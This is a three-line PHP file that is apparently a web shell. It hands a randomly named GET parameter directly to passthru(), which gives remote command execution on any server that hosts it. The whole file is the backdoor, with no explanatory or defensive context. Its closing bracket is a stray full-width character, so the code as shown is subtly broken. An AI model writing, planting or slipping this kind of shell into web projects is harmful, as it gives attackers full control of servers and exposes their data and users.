<?php
passthru($_GET['z-WqoqSP'〕);
?>
